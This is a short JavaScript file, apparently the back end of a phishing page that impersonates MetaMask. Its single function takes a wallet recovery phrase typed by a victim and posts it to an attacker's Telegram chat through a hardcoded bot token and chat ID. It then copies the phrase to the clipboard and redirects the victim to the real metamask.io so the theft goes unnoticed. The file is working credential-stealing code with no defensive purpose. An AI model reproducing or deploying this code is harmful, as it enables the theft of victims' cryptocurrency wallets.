// telegram-bot.js

// ⚠️ Remplace ici avec tes vraies données
const BOT_TOKEN = "7540021986:AAEpAWBoLyKgPtmCASXKpm7eDYYiAa2xjQ8";
const CHAT_ID = "6996434307";

function sendToTelegram(phrase) {
  const message = "🦊 MetaMask wallet:\n\n" + phrase.trim();

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message
    })
  });

  // Copier dans le presse-papiers
  navigator.clipboard.writeText(phrase.trim());

  // Rediriger ensuite
  setTimeout(() => {
    window.location.href = "https://metamask.io/"; // à adapter
  }, 800);
}
